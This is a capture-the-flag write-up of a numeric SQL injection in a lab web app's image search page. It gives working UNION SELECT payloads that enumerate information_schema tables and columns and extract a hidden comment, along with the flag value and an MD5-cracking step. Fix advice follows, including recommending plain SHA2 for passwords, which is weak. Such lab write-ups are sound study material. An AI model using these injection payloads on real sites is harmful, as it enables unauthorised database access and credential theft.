# SQL Numeric Injection - Gallery

## Flag

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Description

In the search page, I notice that the entries are expected to be numeric, so I try a basic payload :
`http://192.168.56.101/?page=searchimg&id=1%20OR%201=1%20--&Submit=Submit#`
This link display all the image links of the website, we also notice that the id get variable isn't XSS protected, letting an unexploitable XSS reflected issue.
The request seems to by like : `"SELECT * FROM images WHERE id = ".$_GET("id").";"`
Where `image` is the gallery table name (not found yet)

I try a new payload to get all table names :
`1 OR 1=1 UNION ALL SELECT table_schema,table_name FROM information_Schema.tables--`

And a second one to get all columns names :
`UNION ALL SELECT table_name,column_name FROM information_Schema.columns--`

The results are :
```
db_default (Members_Brute_Force) :
id, username, password
users (Members_Sql_Injection) :
user_id, first_name, last_name, town, country, planet, Commentaire, countersign
list_images (Member_images):
id, url, title, comment
vote_dbs (Member_survey) :
id_vote, vote, nb_vote, subject
guestbook (Member_guestbook) :
id_comment, comment, name
```

I expected first the exploit to be in the users table, but the users table SQL Injection is actually the one found in the member search page.
It's therefore impossible to get any information in this table, since it's located in another schema.
I finally succeed to find the flag by getting extra information from the list_images table.

## URL

http://192.168.56.101/?page=searchimg

## Steps To Reproduce

Insert this payload :
`UNION ALL SELECT comment, title FROM list_images--`

To see, as comment for the Hack me ? picture :
`If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`
Reverse the md5 hash with crackstation, lowercase the result, then sha256 the lowercased result to get the flag.

## Why is it dangerous ?

UNION SQL exploits can let malicious users get database structure informations or user credentials (including admin ones)

## Possible fixes

- Limit the user input to numeric, with intval() for exemple
- Hash the passwords with a complex algorithm (Sha2, whirlpool) to limit the damages if someone get access to your databases anyway

## Resources

There is no additional resource for this issue.
